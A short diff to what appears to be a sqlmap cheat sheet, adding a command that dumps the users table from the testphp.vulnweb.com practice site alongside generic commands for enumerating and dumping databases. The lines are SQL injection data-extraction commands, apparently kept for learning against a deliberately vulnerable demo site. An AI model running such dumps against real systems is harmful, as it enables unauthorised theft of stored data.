@@ -10,7 +10,12 @@ sqlmap -u url --dbs blog --tables users --columns
 
 sqlmap -u url -D database -T table --dump
 
+
 sqlmap -u url -D database --dump-all --batch
+
+
+sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=2 -D acuart -T users --dump-all -batch  -v 3
+
 
 
 sqlmap -u url --dbs --batch
